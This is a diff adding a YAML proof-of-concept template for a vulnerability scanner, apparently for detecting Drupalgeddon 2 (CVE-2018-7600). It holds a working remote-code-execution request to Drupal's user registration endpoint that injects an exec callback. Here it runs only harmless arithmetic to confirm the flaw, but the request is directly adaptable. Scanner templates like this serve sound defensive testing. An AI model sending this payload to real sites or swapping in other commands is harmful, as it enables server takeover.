@@ -1,0 +1,23 @@
+id: poc-yaml-drupal-register-rce
+info:
+  name: Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2018-7600
+  finger: drupal
+  fofa: null
+variables:
+  t1: random_int(111000,999000)
+  t2: random_int(10,100)
+  t3: t1 - t2
+requests:
+- method: POST
+  path: /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=cmd.exe+/c+set+/a+{{.t1}}+-+{{.t2}}%26expr+{{.t1}}+-+{{.t2}}
+  expression: "status_code == 200 && \ncontains(body,\"\\\"method\\\":\\\"replaceWith\\\
+    \"\") &&\ncontains(body,t3)\n"
+transport: http
